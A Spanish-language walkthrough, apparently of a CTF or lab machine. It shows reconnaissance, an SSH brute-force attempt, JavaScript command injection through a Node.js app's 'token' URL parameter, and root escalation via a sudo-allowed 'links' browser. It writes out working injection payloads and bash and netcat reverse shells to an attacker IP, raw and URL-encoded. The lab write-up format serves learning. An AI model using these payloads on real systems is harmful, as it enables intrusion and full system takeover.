## Reconocimiento
Comenzamos con el respectivo reconocimiento usando `nmap`.
``` bash
nmap -p- -sS -sCV --min-rate 5000 -n -Pn 192.168.0.104 -oG scan
```
![](_anexos_/Screenshot%20from%202023-12-13%2005-05-06.png)
- La versión de ssh en la 9.2p1, bastante actualizada, no hay mucho que hacer por ahi
- Tenemos el puerto 80 disponible, pero en realidad solo hay una pagina manual de apache
- En el puerto 5000 podemos ver lo que parece una app de nodejs, verificamos en el navegador

![](_anexos_/Screenshot%20from%202023-12-13%2005-08-22.png)
Si ingresamos cualquier texto en el campo de `name` nos devuelve una url con el siguiente formato (e.j. con el usuario pepe)
``` html
http://192.168.0.104:5000/?name=pepe&token=55569675
```
- Si modificamos el token en la url con más numeros, la pagina aún carga con 'normalidad'
- Si modificamos agregando un string nos salta un error relacionado con javascript

![](_anexos_/Screenshot%20from%202023-12-13%2005-20-13.png)

Acá podemos deducir:
- Un usuario `aleister`
- El directorio donde corre esta app se encuentra en `/home/aleister/website`

### SSH Force Brute
En este punto al tener un usuario podría resultar interesante ejecutar `hydra` para un ataque de fuerza bruta a través de ssh
``` bash
hydra -l aleister -P /usr/share/dict/rockyou.txt ssh://192.168.0.104 
## SPOILER: no funciona
```
### Javascript Command Injection
En este punto, podemos probar si la url es vulnerable a algun tipo de _command injection_ en el payload.
- El campo user es equivalente al texto que le agregamos en la cajita de nombre y en realidad no ejecuta ningun comando por detras. 
- El campo token ha respondido a la inyección de nuestro codigo javascript que ejecuta en la shell un timer de 5 segundos.
	
```javascript
require('child_process').execSync('sleep 5');
```

Para evitar problemas con los espaciados y saltos de linea en la url le mandamos la instrucción en formato `url-encoded`
``` html
http://192.168.0.104:5000/name=pepe&token=require%28%27child_process%27%29.execSync%28%27sleep%205%27%29%3B
```
Comprobado esto, procedemos a mandar una reverse shell para que nos pueda otorgar una consola desde la que podemos operar. 
- Primeramente nos ponemos en escucha con `ncat` por el puerto 4444.
	``` bash
	ncat -lvp 4444
	```
- Ejecutamos el ya conocido reverse shell por el protocolo TCP a través de bash
	``` bash
	bash -i >& /dev/tcp/192.168.0.107/4444 0>&1 # IP maquina atacante
	```
	La url quedaria de esta forma (con el url-encoded)
	``` html
	http://192.168.0.104:5000/?name=pepe&token=require%28%27child_process%27%29.execSync%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.107%2F4444%200%26%3E1%27%29%3B
	```

##### LECTURA OPCIONAL: POSIX y los problemas con la sintaxis stderr/stdout estandar

Ver: [POSIX y los problemas con stdout - stdeer](POSIX%20y%20los%20problemas%20con%20stdout%20-%20stdeer.md)

#### Reverse shell con netcat
Entonces como tenemos ese problema con sh, podemos buscar otras formas de hacer la `reverse shell`, por ejemplo con `ncat`.
``` bash
nc -e /bin/sh 192.168.0.107 4444
```
Con la url _url-encodeada_, quedaria:
``` html
http://192.168.0.104:5000/?name=pepe&token=require%28%27child_process%27%29.execSync%28%27nc%20-e%20%2Fbin%2Fsh%20192.168.0.107%204444%27%29%3B
```
Ejecutamos y... Bingo!

## Escalada de privilegios (Privesec)
### Tratamiento de la tty
Lo primero que vamos a resolver es la cuestión de la tty. Ejecutamos los siguientes comandos en el ncat que estaba en escucha por el 4444.

Ver: [Linux Full TTY (Interective shell)](Linux%20Full%20TTY%20(Interective%20shell).md)
### Reconocimiento de la maquina victima
Si ejecutamos `sudo -l` podemos ver que tenemos la app ubicada en `/usr/bin/links` que podemos ejecutar como `root` sin necesidad de presentar una contraseña. Probamos, en realidad no parece salir nada, pero si presionamos `Esc` podemos ver un panel de opciones.

![](_anexos_/Screenshot%20from%202023-12-14%2000-54-27.png)
### Ascenso a root
Si buscamos las opciones entre los paneles, podemos ver que en el apartado _File_ existe una opción llamada _OS shell_.

![](_anexos_/Screenshot%20from%202023-12-14%2000-57-01.png)
Si ejecutamos esa opción como tal, nos devolvera una shell como el usuario root. Eso es todo.
##### OPCIONAL: Posibilidad de ascender a root a través de una reverse shell desde una pagina en el navegador (?)
La idea de este punto es poder ejecutar alguna pequeña pagina en la cual le puedas inyectar codigo que se ejecute como `client-side` (nosotros desde el navegador somos el cliente) que probablemente se termine ejecutando como root. Solo es una idea igual y no se si es posible, si bien investigando encontre que hay muchos problemas a la hora de ejecutar comandos en el lado del cliente (lo cual tiene sentido por razones de seguridad).

